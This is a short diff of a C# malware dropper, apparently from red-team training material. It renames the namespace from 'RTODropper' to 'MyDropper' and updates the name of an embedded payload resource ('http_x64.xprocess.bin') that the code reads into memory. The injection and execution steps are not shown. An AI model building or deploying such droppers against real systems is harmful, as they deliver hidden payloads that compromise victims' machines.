@@ -6,7 +6,7 @@ using System.IO;
 using System.Reflection;
 using System.Runtime.InteropServices;
  
-namespace RTODropper
+namespace MyDropper
 {
     public class Dropper
     {
@@ -91,7 +91,7 @@ namespace RTODropper
  
             var assembly = Assembly.GetExecutingAssembly();
  
-            using (var rs = assembly.GetManifestResourceStream("RTODropper.http_x64.xprocess.bin"))
+            using (var rs = assembly.GetManifestResourceStream("MyDropper.http_x64.xprocess.bin"))
             {
                 // convert stream to raw byte[]
                 using (var ms = new MemoryStream())
